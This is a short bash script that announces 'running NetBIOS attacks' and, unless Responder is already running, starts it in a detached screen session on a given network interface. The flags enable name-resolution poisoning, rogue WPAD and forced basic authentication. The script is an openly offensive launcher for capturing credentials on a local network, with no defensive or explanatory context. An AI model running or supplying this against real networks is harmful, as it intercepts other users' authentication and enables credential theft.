#!/bin/bash

echo 'running NetBIOS attacks'

[[ $(pgrep responder) = '' ]] && {
 screen -dmS responder responder -I "$1" -r -d -w -F
}